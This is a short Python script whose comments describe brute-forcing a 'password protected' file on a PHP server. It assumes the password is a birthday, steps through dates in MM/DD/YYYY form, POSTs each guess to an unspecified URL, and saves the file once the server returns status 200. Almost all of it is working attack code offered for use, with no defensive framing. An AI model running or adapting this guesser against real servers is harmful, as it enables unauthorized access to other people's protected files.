## this code pings a php server to grab a "password protected" file
## bruteforce method when you know exactly the files and expected query
## also, password is a birthday

import requests

## password setup vars
month = 11
day = 1
year = 2000

## file/url to ping to grab information
url = ''
s = ""
mal = ""

## post data structure
myobj = {"s": s,
      "mal": mal,
      "p": month}

## loop
flag = False
while flag != True:
  ## add zeros to properly format password
  if month < 10:
    month = '0' + str(month)
  if day < 10:
    day = '0' + str(day)
  ## password structure
  date = str(month) + '/' + str(day) + '/' + str(year)
  ## update password key with date
  myobjtemp = {"p":date}
  myobj.update(myobjtemp)
  
  print(url, myobj)
  x = requests.post(url, data = myobj)

  if x.status_code == 200:
    with open("results.pdf", "wb") as f:
      f.write(x.content)
      f.close()
    print("Completed Operation")
    flag = True
  else:
    month = int(month)
    day = int(day)
    day +=1
    if day == 32:
        day = 1
        month +=1
        if month == 13:
          month = 1
          year += 1
